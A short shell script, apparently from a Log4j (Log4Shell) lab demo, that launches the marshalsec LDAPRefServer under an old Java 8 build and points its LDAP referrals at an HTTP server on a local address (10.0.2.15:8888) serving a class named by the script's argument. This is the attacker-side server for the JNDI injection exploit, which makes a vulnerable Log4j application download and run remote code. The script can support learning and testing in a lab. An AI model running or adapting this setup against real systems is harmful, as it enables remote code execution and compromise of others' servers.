ref=$1
echo  $ref
cd ~/Log4j-demo;
jdk1.8.0_181/bin/java -cp /home/jaco3740/Desktop/Log4j-demo/marshalsec-master/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.0.2.15:8888/#$ref"
